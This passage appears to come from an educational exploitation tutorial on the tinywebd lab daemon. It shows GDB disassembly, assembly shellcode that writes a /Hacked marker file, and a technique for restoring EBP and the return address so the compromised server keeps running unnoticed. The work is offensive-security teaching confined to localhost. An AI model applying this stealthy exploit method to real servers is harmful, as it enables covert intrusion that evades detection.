To put things back together again, we just need to repair any collateral damage caused by the overwrite and/or shellcode, and then jumps execution back into the connection accepting loop in main()
The disassembly of main() in the output below shows that we can safely return to the address 0x08048f64, 0x08048f65, or 0x08048fb7 to get back into the conneciton accept loop
__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc -g tinywebd.c

reader@hacking:~/booksrc $ gdb -q ./a.out
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".

(gdb) disass main
Dump of assembler code for function main:
0x08048d93 <main+0>:    push   ebp 
0x08048d94 <main+1>:    mov    ebp,esp 
0x08048d96 <main+3>:    sub    esp,0x68 
0x08048d99 <main+6>:    and    esp,0xfffffff0 
0x08048d9c <main+9>:    mov    eax,0x0 
0x08048da1 <main+14>:   sub    esp,eax 

.:[ output trimmed ]:.

0x08048f4b <main+440>:  mov    DWORD PTR [esp],eax 
0x08048f4e <main+443>:  call   0x8048860 <listen@plt> 
0x08048f53 <main+448>:  cmp    eax,0xffffffff 
0x08048f56 <main+451>:  jne    0x8048f64 <main+465> 
0x08048f58 <main+453>:  mov    DWORD PTR [esp],0x804961a 
0x08048f5f <main+460>:  call   0x8048ac4 <fatal> 

         0x08048f64 <main+465>:  nop  
         0x08048f65 <main+466>:  mov    DWORD PTR [ebp-60],0x10 

0x08048f6c <main+473>:  lea    eax,[ebp-60] 
0x08048f6f <main+476>:  mov    DWORD PTR [esp+8],eax 
0x08048f73 <main+480>:  lea    eax,[ebp-56] 
0x08048f76 <main+483>:  mov    DWORD PTR [esp+4],eax 
0x08048f7a <main+487>:  mov    eax,ds:0x804a970 
0x08048f7f <main+492>:  mov    DWORD PTR [esp],eax 
0x08048f82 <main+495>:  call   0x80488d0 <accept@plt> 
0x08048f87 <main+500>:  mov    DWORD PTR [ebp-12],eax 
0x08048f8a <main+503>:  cmp    DWORD PTR [ebp-12],0xffffffff 
0x08048f8e <main+507>:  jne    0x8048f9c <main+521> 
0x08048f90 <main+509>:  mov    DWORD PTR [esp],0x804962e 
0x08048f97 <main+516>:  call   0x8048ac4 <fatal> 
0x08048f9c <main+521>:  mov    eax,ds:0x804a96c 
0x08048fa1 <main+526>:  mov    DWORD PTR [esp+8],eax 
0x08048fa5 <main+530>:  lea    eax,[ebp-56] 
0x08048fa8 <main+533>:  mov    DWORD PTR [esp+4],eax 
0x08048fac <main+537>:  mov    eax,DWORD PTR [ebp-12] 
0x08048faf <main+540>:  mov    DWORD PTR [esp],eax 
0x08048fb2 <main+543>:  call   0x8048fb9 <handle_connection> 

      0x08048fb7 <main+548>:  jmp    0x8048f65 <main+466> 

End of assembler dump.
__________________________________________________________________________________

All 3 of these addresses basically go to the same place
Let's use 0x8048fb7 since this is the original return address used for the call to handle_connection()
However, there are other things we need to fix first
Look at the function prologue and epilogue for handle_connection()
These are the instructions that set up and remove the stack frame structures on the stack

__________________________________________________________________________________
(gdb) disass handle_connection
Dump of assembler code for function handle_connection:

      0x08048fb9 <handle_connection+0>:   push   ebp 
      0x08048fba <handle_connection+1>:   mov    ebp,esp 
      0x08048fbc <handle_connection+3>:   push   ebx 
      0x08048fbd <handle_connection+4>:   sub    esp,0x644 

0x08048fc3 <handle_connection+10>:  lea    eax,[ebp-0x218] 
0x08048fc9 <handle_connection+16>:  mov    DWORD PTR [esp+4],eax 
0x08048fcd <handle_connection+20>:  mov    eax,DWORD PTR [ebp+8] 
0x08048fd0 <handle_connection+23>:  mov    DWORD PTR [esp],eax 
0x08048fd3 <handle_connection+26>:  call   0x8048cb0 <recv_line> 
0x08048fd8 <handle_connection+31>:  mov    DWORD PTR [ebp-0x620],eax 
0x08048fde <handle_connection+37>:  mov    eax,DWORD PTR [ebp+12] 
0x08048fe1 <handle_connection+40>:  movzx  eax,WORD PTR [eax+2] 
0x08048fe5 <handle_connection+44>:  mov    DWORD PTR [esp],eax 
0x08048fe8 <handle_connection+47>:  call   0x80488f0 <ntohs@plt> 

.:[ output trimmed ]:.

0x08049302 <handle_connection+841>: call  0x8048850 <write@plt> 
0x08049307 <handle_connection+846>: mov   DWORD PTR  [esp+4],0x2 
0x0804930f <handle_connection+854>: mov   eax,DWORD  PTR [ebp+8] 
0x08049312 <handle_connection+857>: mov   DWORD PTR  [esp],eax 
0x08049315 <handle_connection+860>: call  0x8048800  <shutdown@plt> 

      0x0804931a <handle_connection+865>: add   esp,0x644 
      0x08049320 <handle_connection+871>: pop   ebx 
      0x08049321 <handle_connection+872>: pop   ebp 
      0x08049322 <handle_connection+873>: ret   

End of assembler dump.
__________________________________________________________________________________

At the beginning of the function, the function prologue saves the current values of EBP and EBX registers by pushing them to the stack, and sets EBP to the current value of ESP so it can be used as a point of reference for accessing stack variables
Finally, 0x644 bytes are saved on the stack for these stack variables by subtracting from ESP
The function epilogue at the end restores ESP by adding 0x644 back to it and restores the saved values of EBX and EBP by popping them from the stack back into the registers

The overwrite instructions are actually found in the recv_line() function; however, they write to data in the handle_connection() stack frame, so the overwrite itself happens in handle_connection
The return address that we overwrite is pushed to the stack when handle_connection() is called, so the saved values for EBP and EBX pushed to the stack in the function prologue will be between the return address and the corruptible buffer
This means that EBP and EBX will get mangled when the function epilogue executes
Since we don't gain control of the program's execution until the return instruction, all the instructions between the overwrite and the return instruction must be executed
First, we need to assess how much collateral damage is done by these extra instructions after the overwrite
The assembly instruciton int3 creates the byte 0xcc, which is literally a debugging breakpoint
The shellcode below uses an int3 instruction instead of exiting
This breakpoint will be caught by GDB, allowing us to examine the exact state of the program after the shellcode executes

mark_break.s
__________________________________________________________________________________
BITS 32
; Mark the filesystem to prove you ran
   jmp short one
   two:
   pop ebx              ; Filename
   xor ecx, ecx
   mov BYTE [ebx+7], cl ; Null terminate filename
   push BYTE 0x5        ; Open()
   pop eax
   mov WORD cx, 0x441   ; O_WRONLY|O_APPEND|O_CREAT
   xor edx, edx
   mov WORD dx, 0x180   ; S_IRUSR|S_IWUSR
   int 0x80             ; Open file to create it
      ; eax = returned file descriptor
   mov ebx, eax         ; File descriptor to second arg
   push BYTE 0x6        ; Close()
   pop eax
   int 0x80  ; Close file

   int3   ; interrupt
one:
   call two
db "/HackedX"
__________________________________________________________________________________

To use this shellcode, first get GDB set up to debug the tinyweb daemon
In the output below, a breakpoint is set right before handle_connection() is called
The goal is to restore the mangled registers to their original state found at this breakpoint

__________________________________________________________________________________
reader@hacking:~/booksrc $ ./tinywebd
Starting tiny web daemon.

reader@hacking:~/booksrc $ ps aux | grep tinywebd
root     23497  0.0  0.0   1636   356 ?        Ss    17:08    0:00 ./tinywebd
reader   23506  0.0  0.0   2880   748 pts/1    R+    17:09    0:00 grep tinywebd

reader@hacking:~/booksrc $ gcc -g tinywebd.c

reader@hacking:~/booksrc $ sudo gdb -q -pid=23497 --symbols=./a.out

warning: not using untrusted file "/home/reader/.gdbinit"
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
Attaching to process 23497
/cow/home/reader/booksrc/tinywebd: No such file or directory.
A program is being debugged already. Kill it? (y or n) n
Program not killed.

(gdb) set dis intel

(gdb) x/5i main+533
0x8048fa8 <main+533>:   mov    DWORD PTR [esp+4],eax 
0x8048fac <main+537>:   mov    eax,DWORD PTR [ebp-12] 
0x8048faf <main+540>:   mov    DWORD PTR [esp],eax 

      0x8048fb2 <main+543>:   call   0x8048fb9 <handle_connection> 

0x8048fb7 <main+548>:   jmp    0x8048f65 <main+466> 

(gdb) break *0x8048fb2
Breakpoint 1 at 0x8048fb2: file tinywebd.c, line 72.

(gdb) cont
Continuing.
__________________________________________________________________________________

In the output above, a breakpoint is set right before handle_connection() is called (shown separated)
Then, in another terminal window, the exploit tool is used to throw the new shellcode at it
This will advance execution to the breakpoint in the other terminal

__________________________________________________________________________________
reader@hacking:~/booksrc $ nasm mark_break.s

reader@hacking:~/booksrc $ ./xtool_tinywebd.sh mark_break 127.0.0.1
target IP: 127.0.0.1
shellcode: mark_break (44 bytes)
[NOP (372 bytes)] [shellcode (44 bytes)] [ret addr (128 bytes)]
localhost [127.0.0.1] 80 (www) open
__________________________________________________________________________________

Back in the debugging terminal, the first breakpoint is encountered
Some important stack registers are displayed, which show the stack setup before (and after) the handle_connection() call
Then, execution continues to the int3 instruction in the shellcode, which acts like a breakpoint
Then these stack registers are checked again to view their state at the moment the shellcode begins to execute

__________________________________________________________________________________
Breakpoint 1, 0x08048fb2 in main () at tinywebd.c:72
72            handle_connection(new_sockfd, &client_addr, logfd);

(gdb) i r esp ebx ebp
esp            0xbffff7e0       0xbffff7e0 
ebx            0xb7fd5ff4       -1208131596 
ebp            0xbffff848       0xbffff848 

(gdb) cont
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffff753 in ?? ()

(gdb) i r esp ebx ebp
esp            0xbffff7e0        0xbffff7e0 
ebx            0x6  6   
ebp            0xbffff624        0xbffff624 
__________________________________________________________________________________

This output shows that EBX and EBP are changed at the point the shellcode begins execution
However, an inspection of the instructions in main()'s disassembly shows that EBX isn't actually used
   
   EBX is pushed to the stack frame of handle_connection, but it is not used in the main function neither in the handle_connection

The compiler probably saved this register to the stack due to some rule about calling convention, even though it's not really used
EBP, however, is used heavily, since it's the point of reference for all local stack variables
Because the original saved value of EBP was overwritten by our exploit, the original value must be recreated
When EBP is restored to its original value, the shellcode should be able to do its dirty work and then return back into main() as usual
Since computers are deterministc, the assembly instructions will clearly explain how to do all this

__________________________________________________________________________________
(gdb) set dis intel

(gdb) x/5i main
0x8048d93 <main>:        push    ebp 
0x8048d94 <main+1>:      mov     ebp,esp 
0x8048d96 <main+3>:      sub     esp,0x68 
0x8048d99 <main+6>:      and     esp,0xfffffff0 
0x8048d9c <main+9>:      mov     eax,0x0 

(gdb) x/5i main+533
0x8048fa8 <main+533>:    mov     DWORD PTR  [esp+4],eax 
0x8048fac <main+537>:    mov     eax,DWORD  PTR [ebp-12] 
0x8048faf <main+540>:    mov     DWORD PTR  [esp],eax 
0x8048fb2 <main+543>:    call    0x8048fb9  <handle_connection> 

      0x8048fb7 <main+548>:    jmp     0x8048f65  <main+466> 

__________________________________________________________________________________

A quick glance at the function prologue for main() shows that EBP should be 0x68 bytes larger than ESP
Since ESP wasn't damaged by our exploit, we can restore the value for EBP by adding 0x68 to ESP at the end of our shellcode
With EBP restored to the proper value, the program execution can be safely returned into the connection-accepting loop
The proper return address for the handle_connection() function call is the instruction found after the call at 0x08048fb7

   Note that EBP is fixed for a stack frame

The following shellcode uses this technique

mark_restore.s
__________________________________________________________________________________
BITS 32
; Mark the filesystem to prove you ran
   jmp short one
   two:
   pop ebx              ; Filename
   xor ecx, ecx
   mov BYTE [ebx+7], cl ; Null terminate filename
   push BYTE 0x5        ; Open()
   pop eax
   mov WORD cx, 0x441   ; O_WRONLY|O_APPEND|O_CREAT
   xor edx, edx
   mov WORD dx, 0x180   ; S_IRUSR|S_IWUSR
   int 0x80             ; Open file to create it
      ; eax = returned file descriptor
   mov ebx, eax         ; File descriptor to second arg
   push BYTE 0x6        ; Close()
   pop eax
   int 0x80  ; close file

   lea ebp, [esp+0x68]  ; Restore EBP
   push 0x08048fb7      ; Return address
   ret                  ;
one:
   call two
db "/HackedX"
__________________________________________________________________________________

When assembled and used in an exploit, this shellcode will restore the tinyweb daemon's execution after marking the filesystem
The tinyweb daemon doesn't even know that something happened

__________________________________________________________________________________
reader@hacking:~/booksrc $ nasm mark_restore.s

reader@hacking:~/booksrc $ hexdump -C mark_restore
00000000 eb 26 5b 31 c9 88 4b 07 6a 05 58 66 b9 41 04 31 |.&[1.K.j.Xf.A.1|
00000010 d2 66 ba 80 01 cd 80 89 c3 6a 06 58 cd 80 8d 6c |.f....j.X..l|
00000020 24 68 68 b7 8f 04 08 c3 e8 d5 ff ff ff 2f 48 61 |$hh...../Ha|
00000030 63 6b 65 64 58                                  |ckedX|
00000035

reader@hacking:~/booksrc $ sudo rm /Hacked
reader@hacking:~/booksrc $ ./tinywebd
Starting tiny web daemon.

reader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh mark_restore 127.0.0.1
target IP: 127.0.0.1
shellcode: mark_restore (53 bytes)
fake request: "GET / HTTP/1.1\x00" (15 bytes)
[Fake Request (15 b)] [NOP (348 b)] [shellcode (53 b)] [ret addr (128 b)]
localhost [127.0.0.1] 80 (www) open

reader@hacking:~/booksrc $ ls -l /Hacked
-rw------- 1 root reader 0 2007-09-19 20:37 /Hacked

reader@hacking:~/booksrc $ ps aux | grep tinywebd
root     26787  0.0  0.0   1636   420 ?        Ss   20:37   0:00 ./tinywebd
reader   26828  0.0  0.0   2880   748 pts/1    R+   20:38   0:00 grep tinywebd

reader@hacking:~/booksrc $ ./webserver_id 127.0.0.1
The web server for 127.0.0.1 is Tiny webserver
__________________________________________________________________________________